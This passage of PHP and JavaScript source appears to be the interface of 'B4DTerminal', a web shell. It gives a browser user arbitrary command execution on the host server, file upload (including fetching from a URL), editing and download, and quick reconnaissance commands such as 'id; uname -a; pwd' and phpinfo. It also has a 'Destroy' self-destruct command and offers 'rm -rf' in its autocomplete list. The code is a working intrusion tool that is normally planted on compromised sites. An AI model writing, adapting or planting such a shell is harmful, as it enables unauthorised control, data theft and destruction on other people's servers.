            <h3 class="text-purple-400 font-bold text-sm"><i class="fas fa-edit mr-2"></i>Rename File/Folder</h3>
            <button onclick="closeRenameModal()" class="text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
        </div>
        <div class="p-4 space-y-3">
            <div class="flex gap-3">
                <div class="flex-1">
                    <label class="text-purple-400 text-xs block mb-1"><i class="fas fa-file mr-1"></i>Select File/Folder:</label>
                    <div class="modal-grid p-2 bg-neutral-900/50 border border-purple-500/20 rounded max-h-40 overflow-y-auto">
                        <?php foreach ($directory_contents as $item): ?>
                        <div class="file-item cursor-pointer p-2 rounded border border-transparent hover:border-purple-500/30 hover:bg-purple-900/20" onclick="selectFileForRename('<?= htmlspecialchars($item['name']) ?>')">
                            <div class="flex items-center gap-2">
                                <i class="fas <?= $item['is_dir'] ? 'fa-folder text-yellow-400' : 'fa-file text-blue-400' ?> text-xs"></i>
                                <span class="text-gray-300 text-xs truncate"><?= htmlspecialchars($item['name']) ?></span>
                            </div>
                            <div class="text-gray-500 text-[10px] mt-1">
                                <?= $item['is_dir'] ? 'DIR' : format_file_size($item['size']) ?>
                            </div>
                        </div>
                        <?php endforeach; ?>
                    </div>
                </div>
                <div class="flex-1 space-y-3">
                    <div>
                        <label class="text-purple-400 text-xs block mb-1"><i class="fas fa-pen mr-1"></i>Current Name:</label>
                        <input type="text" id="renameOldName" class="w-full bg-neutral-900 border border-purple-500/30 rounded px-3 py-2 text-white placeholder-gray-500 text-sm" placeholder="Select file/folder from list" readonly>
                    </div>
                    <div>
                        <label class="text-purple-400 text-xs block mb-1"><i class="fas fa-signature mr-1"></i>New Name:</label>
                        <input type="text" id="renameNewName" class="w-full bg-neutral-900 border border-purple-500/30 rounded px-3 py-2 text-white placeholder-gray-500 text-sm" placeholder="new_name.ext">
                    </div>
                </div>
            </div>
        </div>
        <div class="flex gap-2 p-4 border-t border-purple-500/30 bg-purple-900/10">
            <button onclick="renameSubmit()" class="bg-purple-600 text-white px-4 py-2 rounded hover:bg-purple-500 flex-1 text-sm"><i class="fas fa-check mr-2"></i>Rename</button>
            <button onclick="closeRenameModal()" class="bg-neutral-700 text-white px-4 py-2 rounded hover:bg-neutral-600 flex-1 text-sm"><i class="fas fa-times mr-2"></i>Cancel</button>
        </div>
    </div>
</div>

<!-- Edit Modal -->
<div id="editModal" class="fixed inset-0 modal hidden items-center justify-center z-50 p-4">
    <div class="bg-black border border-yellow-500/30 rounded-xl w-full max-w-4xl h-[80vh] flex flex-col">
        <div class="flex items-center justify-between p-4 border-b border-yellow-500/30 bg-yellow-900/10">
            <h3 class="text-yellow-400 font-bold text-sm"><i class="fas fa-edit mr-2"></i>Edit File</h3>
            <button onclick="closeEditModal()" class="text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
        </div>
        <div class="flex-1 p-4 flex gap-3">
            <div class="w-1/3">
                <div class="text-yellow-400 text-xs mb-2"><i class="fas fa-file mr-1"></i>Select File to Edit:</div>
                <div class="modal-grid p-2 bg-neutral-900/50 border border-yellow-500/20 rounded h-full max-h-[60vh] overflow-y-auto">
                    <?php foreach ($directory_contents as $item): ?>
                        <?php if (!$item['is_dir']): ?>
                        <div class="file-item cursor-pointer p-2 rounded border border-transparent hover:border-yellow-500/30 hover:bg-yellow-900/20" onclick="selectFileForEdit('<?= htmlspecialchars($item['name']) ?>')">
                            <div class="flex items-center gap-2">
                                <i class="fas fa-file text-blue-400 text-xs"></i>
                                <span class="text-gray-300 text-xs truncate"><?= htmlspecialchars($item['name']) ?></span>
                            </div>
                            <div class="text-gray-500 text-[10px] mt-1">
                                <?= format_file_size($item['size']) ?> • <?= date('H:i', $item['modified']) ?>
                            </div>
                        </div>
                        <?php endif; ?>
                    <?php endforeach; ?>
                </div>
            </div>
            <div class="w-2/3 flex flex-col">
                <div class="mb-3">
                    <input type="text" id="editFileName" class="w-full bg-neutral-900 border border-yellow-500/30 rounded px-3 py-2 text-white placeholder-gray-500 text-sm" placeholder="File name..." readonly>
                </div>
                <textarea id="editFileContent" class="flex-1 w-full bg-neutral-900 border border-yellow-500/30 rounded px-3 py-2 text-white text-sm resize-none placeholder-gray-500" placeholder="File content..."></textarea>
            </div>
        </div>
        <div class="flex gap-2 p-4 border-t border-yellow-500/30 bg-yellow-900/10">
            <button onclick="saveFile()" class="bg-yellow-600 text-white px-4 py-2 rounded hover:bg-yellow-500 flex-1 text-sm"><i class="fas fa-save mr-2"></i>Save File</button>
            <button onclick="closeEditModal()" class="bg-neutral-700 text-white px-4 py-2 rounded hover:bg-neutral-600 flex-1 text-sm"><i class="fas fa-times mr-2"></i>Cancel</button>
        </div>
    </div>
</div>

<!-- Upload Modal -->
<div id="uploadModal" class="fixed inset-0 modal hidden items-center justify-center z-50 p-4">
    <div class="bg-black border border-emerald-500/30 rounded-xl w-full max-w-md flex flex-col">
        <div class="flex items-center justify-between p-4 border-b border-emerald-500/30 bg-emerald-900/10">
            <h3 class="text-emerald-400 font-bold text-sm"><i class="fas fa-upload mr-2"></i>Upload File</h3>
            <button onclick="closeUploadModal()" class="text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
        </div>
        <div class="p-4 space-y-4">
            <div class="text-center">
                <div class="inline-block p-4 bg-emerald-900/20 rounded-full border border-emerald-500/30">
                    <i class="fas fa-cloud-upload-alt text-emerald-400 text-2xl"></i>
                </div>
                <p class="text-gray-400 text-xs mt-2">Select file to upload to current directory</p>
            </div>
            <div>
                <label class="text-emerald-400 text-xs block mb-2"><i class="fas fa-file mr-1"></i>Select File:</label>
                <input type="file" id="uploadFileInput" class="w-full text-xs text-gray-400 file:bg-emerald-900 file:text-emerald-400 file:border-0 file:px-3 file:py-2 file:rounded cursor-pointer">
            </div>
            <div>
                <label class="text-emerald-400 text-xs block mb-1"><i class="fas fa-location-dot mr-1"></i>Current Path:</label>
                <div class="text-gray-300 text-xs bg-neutral-900/50 p-2 rounded border border-emerald-500/20 break-word"><?= $_SESSION['current_path'] ?></div>
            </div>
        </div>
        <div class="flex gap-2 p-4 border-t border-emerald-500/30 bg-emerald-900/10">
            <button onclick="uploadFile()" class="bg-emerald-600 text-white px-4 py-2 rounded hover:bg-emerald-500 flex-1 text-sm"><i class="fas fa-upload mr-2"></i>Upload</button>
            <button onclick="openUrlUploadModal()" class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-500 flex-1 text-sm"><i class="fas fa-link mr-2"></i>From URL</button>
            <button onclick="closeUploadModal()" class="bg-neutral-700 text-white px-4 py-2 rounded hover:bg-neutral-600 text-sm"><i class="fas fa-times"></i></button>
        </div>
    </div>
</div>

<!-- URL Upload Modal -->
<div id="urlUploadModal" class="fixed inset-0 modal hidden items-center justify-center z-50 p-4">
    <div class="bg-black border border-blue-500/30 rounded-xl w-full max-w-md flex flex-col">
        <div class="flex items-center justify-between p-4 border-b border-blue-500/30 bg-blue-900/10">
            <h3 class="text-blue-400 font-bold text-sm"><i class="fas fa-cloud-download-alt mr-2"></i>Upload from URL</h3>
            <button onclick="closeUrlUploadModal()" class="text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
        </div>
        <div class="p-4 space-y-3">
            <div>
                <label class="text-blue-400 text-xs block mb-1"><i class="fas fa-link mr-1"></i>URL File:</label>
                <input type="text" id="urlInput" class="w-full bg-neutral-900 border border-blue-500/30 rounded px-3 py-2 text-white placeholder-gray-500 text-sm" placeholder="https://example.com/file.zip">
            </div>
            <div>
                <label class="text-blue-400 text-xs block mb-1"><i class="fas fa-save mr-1"></i>Save as (optional):</label>
                <input type="text" id="urlFilename" class="w-full bg-neutral-900 border border-blue-500/30 rounded px-3 py-2 text-white placeholder-gray-500 text-sm" placeholder="file_name.ext">
            </div>
            <div>
                <label class="text-blue-400 text-xs block mb-1"><i class="fas fa-location-dot mr-1"></i>Current Path:</label>
                <div class="text-gray-300 text-xs bg-neutral-900/50 p-2 rounded border border-blue-500/20 break-word"><?= $_SESSION['current_path'] ?></div>
            </div>
        </div>
        <div class="flex gap-2 p-4 border-t border-blue-500/30 bg-blue-900/10">
            <button onclick="startUrlUpload()" class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-500 flex-1 text-sm"><i class="fas fa-download mr-2"></i>Download</button>
            <button onclick="closeUrlUploadModal()" class="bg-neutral-700 text-white px-4 py-2 rounded hover:bg-neutral-600 flex-1 text-sm"><i class="fas fa-times mr-2"></i>Cancel</button>
        </div>
    </div>
</div>

<!-- Download Modal -->
<div id="downloadModal" class="fixed inset-0 modal hidden items-center justify-center z-50 p-4">
    <div class="bg-black border border-cyan-500/30 rounded-xl w-full max-w-md flex flex-col">
        <div class="flex items-center justify-between p-4 border-b border-cyan-500/30 bg-cyan-900/10">
            <h3 class="text-cyan-400 font-bold text-sm"><i class="fas fa-file-download mr-2"></i>Download File</h3>
            <button onclick="closeDownloadModal()" class="text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
        </div>
        <div class="p-4 space-y-3">
            <div>
                <label class="text-cyan-400 text-xs block mb-1"><i class="fas fa-file mr-1"></i>File to download:</label>
                <input type="text" id="downloadFile" class="w-full bg-neutral-900 border border-cyan-500/30 rounded px-3 py-2 text-white placeholder-gray-500 text-sm" placeholder="file_name.ext">
            </div>
            <div>
                <label class="text-cyan-400 text-xs block mb-1"><i class="fas fa-edit mr-1"></i>Save as:</label>
                <input type="text" id="downloadAs" class="w-full bg-neutral-900 border border-cyan-500/30 rounded px-3 py-2 text-white placeholder-gray-500 text-sm" placeholder="custom_name.any_ext">
            </div>
            <div>
                <label class="text-cyan-400 text-xs block mb-1"><i class="fas fa-location-dot mr-1"></i>Current Path:</label>
                <div class="text-gray-300 text-xs bg-neutral-900/50 p-2 rounded border border-cyan-500/20 break-word"><?= $_SESSION['current_path'] ?></div>
            </div>
        </div>
        <div class="flex gap-2 p-4 border-t border-cyan-500/30 bg-cyan-900/10">
            <button onclick="startCustomDownload()" class="bg-cyan-600 text-white px-4 py-2 rounded hover:bg-cyan-500 flex-1 text-sm"><i class="fas fa-download mr-2"></i>Download</button>
            <button onclick="closeDownloadModal()" class="bg-neutral-700 text-white px-4 py-2 rounded hover:bg-neutral-600 flex-1 text-sm"><i class="fas fa-times mr-2"></i>Cancel</button>
        </div>
    </div>
</div>

<!-- PHP Info Modal -->
<div id="phpInfoModal" class="fixed inset-0 modal hidden items-center justify-center z-50 p-2 sm:p-4">
    <div class="bg-black border border-purple-500/30 rounded-xl w-full max-w-6xl h-[90vh] flex flex-col">
        <div class="flex items-center justify-between p-4 border-b border-purple-500/30 bg-purple-900/10">
            <h3 class="text-purple-400 font-bold text-sm"><i class="fab fa-php mr-2"></i>PHP Information</h3>
            <button onclick="closePhpInfoModal()" class="text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
        </div>
        <div class="flex-1 p-4 overflow-auto">
            <div id="phpInfoContent" class="php-info-table-container"></div>
        </div>
        <div class="flex gap-2 p-4 border-t border-purple-500/30 bg-purple-900/10">
            <button onclick="copyPhpInfo()" class="bg-purple-600 text-white px-4 py-2 rounded hover:bg-purple-500 flex-1 text-sm"><i class="fas fa-copy mr-2"></i>Copy Info</button>
            <button onclick="closePhpInfoModal()" class="bg-neutral-700 text-white px-4 py-2 rounded hover:bg-neutral-600 flex-1 text-sm"><i class="fas fa-times mr-2"></i>Close</button>
        </div>
    </div>
</div>

<!-- IP Modal -->
<div id="ipModal" class="fixed inset-0 modal hidden items-center justify-center z-50 p-4">
    <div class="bg-black border border-purple-500/30 rounded-xl w-full max-w-md flex flex-col">
        <div class="flex items-center justify-between p-4 border-b border-purple-500/30 bg-purple-900/10">
            <h3 class="text-purple-400 font-bold text-sm"><i class="fas fa-network-wired mr-2"></i>Network Information</h3>
            <button onclick="closeIpModal()" class="text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
        </div>
        <div class="p-4 space-y-3">
            <div class="bg-neutral-900/50 p-3 rounded border border-purple-500/20">
                <div class="text-purple-400 text-xs mb-1"><i class="fas fa-desktop mr-1"></i>Your IP Address:</div>
                <div id="clientIp" class="text-white font-bold text-sm">Loading...</div>
            </div>
            <div class="bg-neutral-900/50 p-3 rounded border border-purple-500/20">
                <div class="text-purple-400 text-xs mb-1"><i class="fas fa-server mr-1"></i>Server IP:</div>
                <div id="serverIp" class="text-white font-bold text-sm">Loading...</div>
            </div>
            <div class="bg-neutral-900/50 p-3 rounded border border-purple-500/20">
                <div class="text-purple-400 text-xs mb-1"><i class="fas fa-computer mr-1"></i>Hostname:</div>
                <div id="hostname" class="text-white font-bold text-sm">Loading...</div>
            </div>
        </div>
        <div class="flex gap-2 p-4 border-t border-purple-500/30 bg-purple-900/10">
            <button onclick="closeIpModal()" class="bg-purple-600 text-white px-4 py-2 rounded hover:bg-purple-500 flex-1 text-sm"><i class="fas fa-check mr-2"></i>Close</button>
        </div>
    </div>
</div>

<!-- Compress/Extract Modal -->
<div id="compressModal" class="fixed inset-0 modal hidden items-center justify-center z-50 p-4">
    <div class="bg-black border border-amber-500/30 rounded-xl w-full max-w-2xl flex flex-col">
        <div class="flex items-center justify-between p-4 border-b border-amber-500/30 bg-amber-900/10">
            <h3 class="text-amber-400 font-bold text-sm"><i class="fas fa-file-archive mr-2"></i>Compress / Extract</h3>
            <button onclick="closeCompressModal()" class="text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
        </div>
        <div class="p-4 space-y-4">
            <div class="flex gap-4">
                <div class="flex-1">
                    <label class="text-amber-400 text-xs block mb-2"><i class="fas fa-file mr-1"></i>Select Target:</label>
                    <div class="modal-grid p-2 bg-neutral-900/50 border border-amber-500/20 rounded max-h-48 overflow-y-auto">
                        <?php foreach ($directory_contents as $item): ?>
                        <div class="file-item cursor-pointer p-2 rounded border border-transparent hover:border-amber-500/30 hover:bg-amber-900/20" onclick="selectForCompress('<?= htmlspecialchars($item['name']) ?>', <?= $item['is_dir'] ? 'true' : 'false' ?>)">
                            <div class="flex items-center gap-2">
                                <i class="fas <?= $item['is_dir'] ? 'fa-folder text-yellow-400' : 'fa-file text-blue-400' ?> text-xs"></i>
                                <span class="text-gray-300 text-xs truncate"><?= htmlspecialchars($item['name']) ?></span>
                            </div>
                            <div class="text-gray-500 text-[10px] mt-1">
                                <?= $item['is_dir'] ? 'DIR' : format_file_size($item['size']) ?>
                            </div>
                        </div>
                        <?php endforeach; ?>
                    </div>
                </div>
                <div class="flex-1 space-y-3">
                    <div>
                        <label class="text-amber-400 text-xs block mb-1"><i class="fas fa-folder mr-1"></i>Target:</label>
                        <input type="text" id="compressTarget" class="w-full bg-neutral-900 border border-amber-500/30 rounded px-3 py-2 text-white placeholder-gray-500 text-sm" placeholder="Select target above" readonly>
                    </div>
                    <div>
                        <label class="text-amber-400 text-xs block mb-1"><i class="fas fa-archive mr-1"></i>Archive Name:</label>
                        <input type="text" id="archiveName" class="w-full bg-neutral-900 border border-amber-500/30 rounded px-3 py-2 text-white placeholder-gray-500 text-sm" placeholder="archive.zip or folder_name">
                    </div>
                </div>
            </div>
            
            <!-- Status Display -->
            <div id="compressStatus" class="mt-3 text-xs p-2 rounded hidden"></div>
            
            <div class="grid grid-cols-2 gap-2">
                <button onclick="compressAction('zip')" class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-500 flex items-center justify-center gap-2 text-sm">
                    <i class="fas fa-file-zipper"></i> ZIP
                </button>
                <button onclick="compressAction('unzip')" class="bg-green-600 text-white px-4 py-2 rounded hover:bg-green-500 flex items-center justify-center gap-2 text-sm">
                    <i class="fas fa-expand"></i> UNZIP
                </button>
                <button onclick="compressAction('tar')" class="bg-orange-600 text-white px-4 py-2 rounded hover:bg-orange-500 flex items-center justify-center gap-2 text-sm">
                    <i class="fas fa-file-archive"></i> TAR.GZ
                </button>
                <button onclick="compressAction('untar')" class="bg-purple-600 text-white px-4 py-2 rounded hover:bg-purple-500 flex items-center justify-center gap-2 text-sm">
                    <i class="fas fa-file-export"></i> UNTAR
                </button>
            </div>
        </div>
        <div class="flex gap-2 p-4 border-t border-amber-500/30 bg-amber-900/10">
            <button onclick="closeCompressModal()" class="bg-neutral-700 text-white px-4 py-2 rounded hover:bg-neutral-600 flex-1 text-sm"><i class="fas fa-times mr-2"></i>Close</button>
        </div>
    </div>
</div>

<!-- Command History Modal -->
<div id="historyModal" class="fixed inset-0 modal hidden items-center justify-center z-50 p-4">
    <div class="bg-black border border-indigo-500/30 rounded-xl w-full max-w-2xl flex flex-col h-[70vh]">
        <div class="flex items-center justify-between p-4 border-b border-indigo-500/30 bg-indigo-900/10">
            <h3 class="text-indigo-400 font-bold text-sm"><i class="fas fa-history mr-2"></i>Command History</h3>
            <button onclick="closeHistoryModal()" class="text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
        </div>
        <div class="p-4 flex-1 overflow-y-auto">
            <div id="historyList" class="space-y-2">
                <!-- History akan diisi oleh JavaScript -->
            </div>
        </div>
        <div class="flex gap-2 p-4 border-t border-indigo-500/30 bg-indigo-900/10">
            <button onclick="clearHistory()" class="bg-red-600 text-white px-4 py-2 rounded hover:bg-red-500 flex-1 text-sm"><i class="fas fa-trash mr-2"></i>Clear History</button>
            <button onclick="exportHistory()" class="bg-green-600 text-white px-4 py-2 rounded hover:bg-green-500 flex-1 text-sm"><i class="fas fa-download mr-2"></i>Export</button>
            <button onclick="closeHistoryModal()" class="bg-indigo-600 text-white px-4 py-2 rounded hover:bg-indigo-500 flex-1 text-sm"><i class="fas fa-times mr-2"></i>Close</button>
        </div>
    </div>
</div>

<!-- Main Terminal Window -->
<div class="terminal-window bg-black border border-neutral-800 rounded-xl shadow-2xl flex flex-col w-full max-w-7xl h-full sm:h-[90dvh]">
<header class="h-10 border-b border-white/10 flex items-center justify-between px-3 bg-neutral-900/50 shrink-0 rounded-t-xl">
    <div class="flex items-center gap-2">
        <div class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></div>
        <span class="font-bold text-gray-200 text-sm">B4DTerminal</span> <span class="text-xs text-gray-600">© Pawline</span>
    </div>
    <div class="flex gap-3">
        <span class="text-gray-600 hidden sm:block text-xs"><?= php_uname('s') ?></span>
        <a href="?terminate" class="text-red-500 hover:text-red-400 font-bold text-xs"><i class="fas fa-sign-out-alt mr-1"></i>Exit</a>
    </div>
</header>

<main id="tm" class="flex-1 overflow-hidden relative flex flex-col">
    <div class="output-bg"></div>
    <div class="output-content"></div>
    <div id="out" class="flex-1 overflow-y-auto overflow-x-hidden p-4 space-y-1 relative z-10">
        <div class="text-gray-600 mb-4 text-xs">Process ID: <?= getmypid() ?></div>
        <div id="status" class="text-emerald-500 font-semibold text-xs mb-2"></div>
    </div>
</main>

<footer class="bg-black border-t border-white/10 z-20 shrink-0 rounded-b-xl">
    <!-- Auto Complete Suggestions -->
    <div id="autocompleteSuggestions" class="autocomplete-suggestions hidden"></div>
    
    <!-- Upload Section (HIDDEN) -->
    <div id="up" class="hidden bg-neutral-900 p-2 border-b border-white/5 flex gap-2">
        <input type="file" id="fi" class="w-full text-xs text-gray-400 file:bg-emerald-900 file:text-emerald-400 file:border-0 file:px-2 file:py-1 file:rounded cursor-pointer">
        <button id="ub" class="bg-emerald-600 text-white px-3 py-1 rounded hover:bg-emerald-500 text-xs"><i class="fas fa-upload mr-1"></i>Upload</button>
        <button onclick="openUrlUploadModal()" class="bg-blue-600 text-white px-3 py-1 rounded hover:bg-blue-500 text-xs"><i class="fas fa-cloud-download-alt mr-1"></i>From URL</button>
    </div>

    <!-- Quick Actions with Scroll Arrows -->
    <div class="quick-scroll bg-neutral-900/50 relative">
        
        <!-- Action Buttons -->
        <button onclick="execute('ls -la --color=never')" class="quick-action-btn bg-green-900/30 hover:bg-green-900/50 border border-green-500/30 rounded text-green-400 whitespace-nowrap">
            <i class="fas fa-list"></i><span>List</span>
        </button>
        <button onclick="openCreateFolderModal()" class="quick-action-btn bg-blue-900/30 hover:bg-blue-900/50 border border-blue-500/30 rounded text-blue-400 whitespace-nowrap">
            <i class="fas fa-folder-plus"></i><span>Folder</span>
        </button>
        <button onclick="openCreateFileModal()" class="quick-action-btn bg-green-900/30 hover:bg-green-900/50 border border-green-500/30 rounded text-green-400 whitespace-nowrap">
            <i class="fa-regular fa-file"></i><span>File</span>
        </button>
        <button onclick="openRenameModal()" class="quick-action-btn bg-purple-900/30 hover:bg-purple-900/50 border border-purple-500/30 rounded text-purple-400 whitespace-nowrap">
            <i class="fas fa-edit"></i><span>Rename</span>
        </button>
        <button onclick="openEditModal()" class="quick-action-btn bg-yellow-900/30 hover:bg-yellow-900/50 border border-yellow-500/30 rounded text-yellow-400 whitespace-nowrap">
            <i class="fas fa-edit"></i><span>Edit</span>
        </button>
        <button onclick="openDownloadModal()" class="quick-action-btn bg-cyan-900/30 hover:bg-cyan-900/50 border border-cyan-500/30 rounded text-cyan-400 whitespace-nowrap">
            <i class="fas fa-download"></i><span>Download</span>
        </button>
        <button onclick="openUploadModal()" class="quick-action-btn bg-emerald-900/30 hover:bg-emerald-900/50 border border-emerald-500/30 rounded text-emerald-400 whitespace-nowrap">
            <i class="fas fa-upload"></i><span>Upload</span>
        </button>
        
        <button onclick="openCompressModal()" class="quick-action-btn bg-amber-900/30 hover:bg-amber-900/50 border border-amber-500/30 rounded text-amber-400 whitespace-nowrap">
            <i class="fas fa-file-archive"></i><span>Compress</span>
        </button>
        
        <button onclick="openHistoryModal()" class="quick-action-btn bg-indigo-900/30 hover:bg-indigo-900/50 border border-indigo-500/30 rounded text-indigo-400 whitespace-nowrap">
            <i class="fas fa-history"></i><span>History</span>
        </button>
        
        <button onclick="execute('id; uname -a; pwd')" class="quick-action-btn bg-orange-900/30 hover:bg-orange-900/50 border border-orange-500/30 rounded text-orange-400 whitespace-nowrap">
            <i class="fas fa-info-circle"></i><span>Info</span>
        </button>
        
        <button onclick="openPhpInfoModal()" class="quick-action-btn bg-purple-900/30 hover:bg-purple-900/50 border border-purple-500/30 rounded text-purple-400 whitespace-nowrap">
            <i class="fab fa-php"></i><span>PHP Info</span>
        </button>
        
        <button onclick="showIpInfo()" class="quick-action-btn bg-purple-900/30 hover:bg-purple-900/50 border border-purple-500/30 rounded text-purple-400 whitespace-nowrap">
            <i class="fas fa-network-wired"></i><span>IP Info</span>
        </button>
        <button onclick="execute('help')" class="quick-action-btn bg-yellow-900/30 hover:bg-yellow-900/50 border border-yellow-500/30 rounded text-yellow-400 whitespace-nowrap">
            <i class="fas fa-question-circle"></i><span>Help</span>
        </button>
        <button onclick="if(confirm('Destroy system?'))execute('remove_system')" class="quick-action-btn bg-red-900/30 hover:bg-red-900/50 border border-red-500/30 rounded text-red-400 whitespace-nowrap">
            <i class="fas fa-skull"></i><span>Destroy</span>
        </button>
    </div>

    <div class="p-3 g rounded-b-xl">
        <div class="flex justify-between items-center text-[10px] text-gray-500 mb-2 px-1 gap-2">
            <div class="flex items-center gap-1 overflow-x-auto breadcrumb-container flex-1 min-w-0 py-1">
                <div id="wd" class="flex items-center gap-1 breadcrumb-text">
                    <?php echo generate_path($_SESSION['current_path']); ?>
                </div>
            </div>
            
            <div class="php-badge px-2 py-1 rounded-lg flex items-center gap-1 flex-shrink-0 group hover:bg-neutral-800/80 transition-colors php-version">
                <i class="fab fa-php text-purple-300 text-xs"></i>
                <span class="text-gray-200 text-xs font-semibold group-hover:text-white transition-colors">
                    <?= substr(phpversion(), 0, 5) ?>
                </span>
            </div>
        </div>
        <div class="relative autocomplete-container">
            <span class="absolute left-3 top-2 text-emerald-500 font-bold">$</span>
            <input id="ci" class="w-full bg-neutral-900 border border-emerald-500/30 rounded pl-6 pr-10 py-2 focus:outline-none focus:border-emerald-500 text-gray-200 placeholder-gray-500 text-sm transition-colors" autocomplete="off" spellcheck="false" placeholder="command...">
            <button id="sb" class="absolute right-2 top-2 text-emerald-500 hover:text-emerald-300 transition font-bold"><i class="fas fa-play"></i></button>
        </div>
    </div>
</footer>
</div>

<script>
const output_area = document.getElementById('out'), 
      input_field = document.getElementById('ci'), 
      path_display = document.getElementById('wd'), 
      status_display = document.getElementById('status'),
      autocomplete_suggestions = document.getElementById('autocompleteSuggestions'),
      quick_scroll = document.querySelector('.quick-scroll');
      
const detectedMethod = '<?= $detected_method ?>';
let initialCommand = true;

let commandHistory = [];
let historyIndex = -1;
let autocompleteIndex = -1;
let currentSuggestions = [];

// Database commands untuk autocomplete
const commandDatabase = [
    // File Operations
    { cmd: 'ls', desc: 'List files', type: 'command', icon: 'fa-list' },
    { cmd: 'ls -la', desc: 'List all files with details', type: 'command', icon: 'fa-list' },
    { cmd: 'cd ', desc: 'Change directory', type: 'command', icon: 'fa-folder' },
    { cmd: 'pwd', desc: 'Print working directory', type: 'command', icon: 'fa-map-marker-alt' },
    { cmd: 'cat ', desc: 'View file content', type: 'command', icon: 'fa-file-alt' },
    { cmd: 'touch ', desc: 'Create empty file', type: 'command', icon: 'fa-file' },
    { cmd: 'mkdir ', desc: 'Create directory', type: 'command', icon: 'fa-folder-plus' },
    { cmd: 'rm ', desc: 'Remove file', type: 'command', icon: 'fa-trash' },
    { cmd: 'rm -rf ', desc: 'Remove recursively', type: 'warning', icon: 'fa-trash-alt' },
    { cmd: 'cp ', desc: 'Copy file', type: 'command', icon: 'fa-copy' },
    { cmd: 'mv ', desc: 'Move/rename file', type: 'command', icon: 'fa-arrows-alt' },
    { cmd: 'chmod ', desc: 'Change permissions', type: 'command', icon: 'fa-lock' },
    { cmd: 'chown ', desc: 'Change ownership', type: 'command', icon: 'fa-user-shield' },
    
    // System Info
    { cmd: 'id', desc: 'User identity', type: 'info', icon: 'fa-id-card' },
    { cmd: 'whoami', desc: 'Current user', type: 'info', icon: 'fa-user' },
    { cmd: 'uname -a', desc: 'System information', type: 'info', icon: 'fa-info-circle' },
    { cmd: 'df -h', desc: 'Disk space', type: 'info', icon: 'fa-hdd' },
    { cmd: 'free -m', desc: 'Memory usage', type: 'info', icon: 'fa-memory' },
    { cmd: 'top', desc: 'Process monitor', type: 'info', icon: 'fa-chart-line' },
    { cmd: 'ps aux', desc: 'All processes', type: 'info', icon: 'fa-tasks' },
    
    // Network
    { cmd: 'ping ', desc: 'Ping host', type: 'network', icon: 'fa-wifi' },
    { cmd: 'curl ', desc: 'Fetch URL', type: 'network', icon: 'fa-globe' },
    { cmd: 'wget ', desc: 'Download file', type: 'network', icon: 'fa-download' },
    { cmd: 'netstat -tulpn', desc: 'Network connections', type: 'network', icon: 'fa-network-wired' },
    { cmd: 'ifconfig', desc: 'Network interfaces', type: 'network', icon: 'fa-ethernet' },
    
    // Search & Text
    { cmd: 'find ', desc: 'Search files', type: 'search', icon: 'fa-search' },
    { cmd: 'grep ', desc: 'Search text', type: 'search', icon: 'fa-search' },
    { cmd: 'tail -f ', desc: 'Follow file', type: 'command', icon: 'fa-stream' },
    { cmd: 'head ', desc: 'First lines', type: 'command', icon: 'fa-align-left' },
    
    // Compression
    { cmd: 'zip ', desc: 'Create ZIP archive', type: 'archive', icon: 'fa-file-zipper' },
    { cmd: 'unzip ', desc: 'Extract ZIP', type: 'archive', icon: 'fa-expand' },
    { cmd: 'tar -czf ', desc: 'Create TAR.GZ', type: 'archive', icon: 'fa-file-archive' },
    { cmd: 'tar -xzf ', desc: 'Extract TAR.GZ', type: 'archive', icon: 'fa-file-export' },
    
    // B4DTerm Special
    { cmd: 'help', desc: 'Show help', type: 'help', icon: 'fa-question-circle' },
    { cmd: 'clear', desc: 'Clear screen', type: 'command', icon: 'fa-broom' },
    { cmd: 'remove_system', desc: 'Self destruct', type: 'danger', icon: 'fa-skull' }
];

const helpContent = `
B4DTerm v2.1 Enhanced:

Quick Actions:
📁 List      - View files and directories
📂 Folder    - Create new folder
📄 File      - Create new file  
✏️ Rename    - Rename file/folder
📝 Edit      - Edit file content
📥 Download  - Download file
📤 Upload    - Upload file or from URL
🗜️ Compress  - ZIP/TAR compression
📜 History   - Command history
🖥️ Info      - System information
🐘 PHP Info  - PHP information
🌐 IP Info   - Display IP & server info
❓ Help      - Show this guide
💀 Destroy   - Self Destruct!

Auto Complete: Type and use TAB/↑↓ arrows
`;

// ================ SCROLL FUNCTIONS ================
const scrollQuickActions = (scrollAmount) => {
    quick_scroll.scrollLeft += scrollAmount;
};

// ================ PHP INFO FUNCTIONS ================
const openPhpInfoModal = async () => {
    document.getElementById('phpInfoModal').classList.remove('hidden');
    document.getElementById('phpInfoContent').innerHTML = '<div class="text-center py-8"><i class="fas fa-spinner fa-spin text-purple-500 text-2xl"></i><div class="text-gray-400 mt-2">Loading PHP information...</div></div>';
    
    try {
        const formData = new FormData();
        formData.append('php_info', '1');
        
        const response = await fetch('', {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (result.status && result.html) {
            document.getElementById('phpInfoContent').innerHTML = result.html;
            
            // Add custom styling to PHP info table
            const tables = document.querySelectorAll('#phpInfoContent table');
            tables.forEach(table => {
                table.classList.add('php-info-table');
                table.style.width = '100%';
            });
            
            // Add scrollable container for better mobile experience
            const container = document.getElementById('phpInfoContent');
            container.style.overflow = 'auto';
            container.style.maxHeight = 'calc(90vh - 140px)';
        } else {
            document.getElementById('phpInfoContent').innerHTML = '<div class="text-red-500 text-center py-8">Failed to load PHP information</div>';
        }
    } catch (error) {
        document.getElementById('phpInfoContent').innerHTML = '<div class="text-red-500 text-center py-8">Error loading PHP information: ' + error.message + '</div>';
    }
};

const closePhpInfoModal = () => {
    document.getElementById('phpInfoModal').classList.add('hidden');
};

const copyPhpInfo = async () => {
    try {
        const phpInfoText = document.getElementById('phpInfoContent').innerText;
        await navigator.clipboard.writeText(phpInfoText);
        showToast('PHP information copied to clipboard', 'success');
    } catch (err) {
        const textArea = document.createElement('textarea');
        textArea.value = document.getElementById('phpInfoContent').innerText;
        document.body.appendChild(textArea);
